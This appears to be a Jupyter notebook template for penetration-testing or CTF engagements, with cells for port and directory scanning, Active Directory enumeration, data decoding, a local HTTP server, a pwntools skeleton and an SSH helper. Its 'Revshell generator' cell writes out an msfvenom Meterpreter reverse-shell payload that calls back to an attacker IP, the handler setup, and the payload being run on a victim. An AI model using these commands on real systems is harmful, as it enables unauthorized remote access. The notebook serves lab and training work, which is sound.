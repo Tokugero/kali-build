{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# TEMPLATE"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Engagement Notes"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Enumeration"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Set variables for further engagement"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from pprint import pprint\n",
    "\n",
    "source =! ip address | grep tun | grep 10 | tr \"/\" \" \" | awk '{print $2}'\n",
    "public_source = requests.get('https://ifconfig.co/ip').text\n",
    "target = 'TEMPLATE'\n",
    "\n",
    "print(f\"source: {source}\")\n",
    "print(f\"target: {target}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Port scan target"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!docker run -it --rm -v $(pwd):/app/target rustscan -a $target"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### URL scan target"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!gobuster dir -u http://$target -w $(wordlists_path)/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -x txt,js,html,php -t 40 --timeout=6s -o gobuster-task.txt --retry"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Revshell generator\n",
    "\n",
    "```sh\n",
    "# On attack box\n",
    "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=9999 -f exe > shell.exe\n",
    "\n",
    "msf6 > use exploit/multi/handler\n",
    "[*] Using configured payload generic/shell_reverse_tcp\n",
    "msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp\n",
    "payload => windows/meterpreter/reverse_tcp\n",
    "msf6 exploit(multi/handler) > set lhost 10.10.14.28\n",
    "lhost => 10.10.14.28\n",
    "msf6 exploit(multi/handler) > set lport 9999\n",
    "lport => 9999\n",
    "msf6 exploit(multi/handler) > run\n",
    "\n",
    "# On victim\n",
    "*Evil-WinRM* PS C:\\Users\\steph.cooper\\Downloads> ./shell.exe\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Windows"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Start Bloodhound"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!mkdir -p ./bloodhounddumps\n",
    "!docker compose --project-directory ~/.local/build/programs/bloodhound --progress quiet down \n",
    "!docker compose --project-directory ~/.local/build/programs/bloodhound --progress quiet up -d\n",
    "print(\"Connect to bloodhound now at http://localhost:8080 with username 'admin' password 'bloodhound'\")\n",
    "print(\"To reset the entire instance, do docker compose down --volumes\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "domain = target.split(\".\")[0]\n",
    "domain_spn = ','.join([f\"dc={dc},\" for dc in target.split(\".\")])\n",
    "initialuser = \"\"\n",
    "initialpassword = \"\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Enumerate"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!enum4linux-ng $target -u $initialuser -p initialpassword"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!smbclient -L //$target -U '{domain}/{initialuser}'%'{initialpassword}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!bloodhound-python -u $initialuser -p $initialpassword -d $domain -dc $target -c All"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!ldapsearch -x -H ldap://$target -D '{domain}\\{initialuser}' -w $initialpassword -b $domain_spn '(objectClass=person)'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Process Data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from chepy import Chepy\n",
    "\n",
    "exampleinput = 'flaghere'\n",
    "\n",
    "encodedinput = (\n",
    "        Chepy(exampleinput)\n",
    "        .rot_13()\n",
    "        .to_base64()\n",
    "        .str_to_hex()\n",
    "    )\n",
    "\n",
    "print(encodedinput)\n",
    "\n",
    "encodedoutput = (\n",
    "    Chepy(str(encodedinput))\n",
    "        .hex_to_str()\n",
    "        .from_base64()\n",
    "        .rot_13()\n",
    "    )\n",
    "\n",
    "print(encodedoutput)\n",
    "\n",
    "aesencoded = Chepy(\"moreflag\").aes_encrypt(\"secret password!\", mode=\"ECB\", key_format=\"str\").o\n",
    "print(aesencoded)\n",
    "aesdecoded = Chepy(aesencoded).aes_decrypt(\"secret password!\", mode=\"ECB\", key_format=\"str\").o\n",
    "print(aesdecoded)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exploit"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Local HTTP server"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Need all this to run a forked server but keep the output \n",
    "# where I can see it while still being able to execute other cells.\n",
    "\n",
    "# This is just as easily `python -m http.server 8080` in a terminal\n",
    "\n",
    "import psutil\n",
    "import socket\n",
    "from time import sleep\n",
    "from multiprocessing import Process\n",
    "from http.server import HTTPServer, SimpleHTTPRequestHandler\n",
    "\n",
    "def server():\n",
    "    pids = [conn.pid for conn in psutil.net_connections() if conn.laddr.port == 8080]\n",
    "    if len(pids) > 0:  \n",
    "        psutil.Process(pids[0]).terminate()\n",
    "        sleep(1) # Need a little time to kill process before trying to use port again\n",
    "    httpd = HTTPServer(('localhost', 8080), SimpleHTTPRequestHandler)\n",
    "    httpd.serve_forever()\n",
    "\n",
    "server = Process(target=server, args=())\n",
    "server.start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!echo \"Run '/usr/local/bin/ngrok tcp 8080' to port forward\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## pwntools"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "\n",
    "# Set up pwntools for the correct architecture\n",
    "context.update(arch='amd64')\n",
    "context.terminal = ['ghostty', '-e']\n",
    "exe = './'\n",
    "elf = context.binary = ELF(exe, checksec=False)\n",
    "\n",
    "def start(argv=[], *a, **kw):\n",
    "    return process([exe] + argv, *a, **kw)\n",
    "\n",
    "#===========================================================\n",
    "#                    EXPLOIT GOES HERE\n",
    "#===========================================================\n",
    "\n",
    "io = start()\n",
    "\n",
    "io.close()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## SSH Establish"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# set up paramiko ssh client\n",
    "user = {\n",
    "    'username': '',\n",
    "    'password': ''\n",
    "}\n",
    "import paramiko\n",
    "ssh_user = paramiko.SSHClient()\n",
    "\n",
    "# set up ssh client\n",
    "ssh_user.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "\n",
    "# connect to ssh\n",
    "ssh_user.connect(target, username=user['username'], password=user['password'])\n",
    "\n",
    "def user(command):\n",
    "    stdin, stdout, stderr = ssh_lennie.exec_command(command)\n",
    "    return stdout.readlines()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Post Notes"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
